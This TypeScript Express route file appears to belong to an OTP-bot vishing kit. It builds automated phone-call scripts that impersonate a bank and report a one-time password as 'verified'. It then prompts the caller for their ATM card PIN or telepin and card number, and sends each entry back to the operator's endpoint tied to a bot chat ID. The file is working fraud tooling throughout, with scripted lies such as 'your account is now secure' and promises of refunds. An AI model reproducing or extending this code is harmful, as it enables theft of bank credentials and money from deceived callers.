import { app } from '..';
import { bot } from '../..';
import { v4 as uuidv4 } from 'uuid';

app.post(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
  const { language, step, chatId, loop } = req.params;
  const { askCardInfo, cardType, otpLength } = req.query;

  // @ts-expect-error it will exist
  const { valid } = Object.keys(bot.context).length
    ? bot.context
    : {
        valid: undefined,
      };
  const l = Number(loop) < 4 ? Number(loop) + 1 : 4;

  if ((!(l < 4) && valid === `undifined`) || valid) {
    switch (step) {
      case `bank`:
        res.json({
          id: uuidv4(),
          title: `call BANK STEP - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your ${
                  language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
                }, the same pin you use at the ATM, followed by the pound key.`,
                language,
                voice: 'female',
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: 'nextStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
              },
            },
          ],
        });
        // @ts-expect-error I can do this
        bot.context = {};
        break;

      case `pay`:
        res.json({
          id: uuidv4(),
          title: `call PAY STEP - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `To AUTHENTICATE YOU please enter your ${
                  language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
                }, the same pin you use at the ATM,  followed by the pound key.`,
                language,
                voice: 'female',
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 8,
            },
            {
              id: 'nextStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
              },
            },
          ],
        });
        // @ts-expect-error I can do this
        bot.context = {};
        break;
      case `account`:
        if (askCardInfo === 'yes') {
          res.json({
            id: uuidv4(),
            title: `call PAY STEP - ${chatId}`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload: `We need to verify you, please enter your ${
                    cardType !== 'undefined' ? cardType : ''
                  } card number followed by the pound key.`,
                  language,
                  voice: 'female',
                },
                onKeypressGoto: 'nextStepGoto',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: 18,
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepGoto',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: 18,
              },
              {
                id: 'nextStepGoto',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes&otpLength=${otpLength}`,
                },
              },
            ],
          });
          // @ts-expect-error I can do this
          bot.context = {};
          break;
        } else {
          res.json({
            id: uuidv4(),
            title: `call bank - ${chatId} no OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload: `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                  language,
                  voice: 'female',
                },
              },
            ],
          });
          // @ts-expect-error I can do this
          bot.context = {};
          break;
        }

      default:
        break;
    }
  }

  if (valid === false) {
    res.json({
      id: uuidv4(),
      title: `call ACCOUNT STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}&cardType=${cardType}&otpLength=${otpLength}`,
          },
        },
      ],
    });
    // @ts-expect-error I can do this
    bot.context = {};
  }

  res.json({
    id: uuidv4(),
    title: `call ACCOUNT STEP - ${chatId}`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: `Please wait while we verify your input.`,
          language,
          voice: 'female',
        },
      },
      {
        id: uuidv4(),
        action: 'pause',
        options: {
          length: 5,
        },
      },
      {
        id: 'nextStepGoto',
        action: 'fetchCallFlow',
        options: {
          url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${l}?otpLength=${otpLength}`,
        },
      },
    ],
  });

  // @ts-expect-error I can do this
  bot.context = {};
  return;
});
